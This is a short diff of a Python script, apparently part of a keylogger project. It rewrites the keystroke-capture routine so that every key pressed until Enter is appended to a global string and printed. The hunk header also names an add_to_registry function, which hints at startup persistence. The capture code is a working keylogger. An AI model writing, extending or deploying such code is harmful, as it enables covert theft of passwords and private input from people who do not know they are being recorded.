@@ -168,20 +168,22 @@ def add_to_registry(program_name):
 
 
 # key logger
-string = []
+string = ""
 
 def on_press(key):
+    global string
+
     try:
         if key == keyboard.Key.enter:
             return False
         
         else:
             # print('alphanumeric key {0} pressed'.format(key.char))
-            string.append(format(key.char))
+            string += format(key.char)
 
     except AttributeError:
         # print('special key {0} pressed'.format(key))
-        string.append(format(key))
+        string += format(key)
     
     # return string
 
@@ -194,4 +196,4 @@ def key_log():
     listener.start()
 
 key_log()
-print(string)
+print("logged string: " + string)
